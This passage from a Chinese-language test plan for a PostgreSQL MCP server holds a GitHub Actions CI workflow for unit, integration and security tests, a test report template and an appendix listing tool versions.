          pytest tests/unit/ -v --cov=src/pg_mcp --cov-report=xml

      - name: Upload coverage
        uses: codecov/codecov-action@v4
        with:
          files: coverage.xml

  integration-tests:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:14
        env:
          POSTGRES_USER: postgres
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: test_pg_mcp
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: pip install -e ".[dev]"

      - name: Run integration tests
        env:
          TEST_DB_HOST: localhost
          TEST_DB_PORT: 5432
          TEST_DB_USER: postgres
          TEST_DB_PASSWORD: postgres
          TEST_DB_NAME: test_pg_mcp
        run: pytest tests/integration/ -v -m integration

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: pip install -e ".[dev]"

      - name: Run security tests
        run: pytest tests/security/ -v -m security
```

---

## 9. 测试报告模板

### 9.1 测试摘要报告

```markdown
# pg-mcp 测试报告

## 执行摘要

| 指标 | 值 |
|------|-----|
| 测试日期 | YYYY-MM-DD |
| 总测试数 | XXX |
| 通过 | XXX |
| 失败 | XXX |
| 跳过 | XXX |
| 覆盖率 | XX% |

## 按类别分解

| 类别 | 通过 | 失败 | 覆盖率 |
|------|------|------|--------|
| 单元测试 | XX | XX | XX% |
| 集成测试 | XX | XX | N/A |
| E2E 测试 | XX | XX | N/A |
| 安全测试 | XX | XX | N/A |
| 性能测试 | XX | XX | N/A |

## 关键发现

### 通过的关键测试
- SQL 验证器安全测试：所有 XX 个注入测试通过
- 敏感数据保护：所有 XX 个测试通过

### 失败的测试（需要关注）
- [测试名称]: [失败原因]

### 性能指标
- 平均查询延迟: XXX ms
- P99 延迟: XXX ms
- 吞吐量: XXX req/s
```

---

## 10. 附录

### 10.1 测试工具版本

| 工具 | 版本 | 用途 |
|------|------|------|
| pytest | ≥8.0.0 | 测试框架 |
| pytest-asyncio | ≥0.24.0 | 异步测试支持 |
| pytest-cov | ≥5.0.0 | 覆盖率报告 |
| pytest-mock | ≥3.14.0 | Mock 支持 |
| pytest-xdist | ≥3.5.0 | 并行测试 |
| testcontainers | ≥4.0.0 | 动态测试容器 |

### 10.2 相关文档

- [0002-pg-mcp-design.md](./0002-pg-mcp-design.md) - 技术设计文档
- [0004-pg-mcp-impl-plan.md](./0004-pg-mcp-impl-plan.md) - 实现计划

---

## 修订历史

| 版本 | 日期       | 作者 | 修改内容     |
|------|------------|------|-------------|
| v1.0 | 2025-12-20 | -    | 初始版本     |
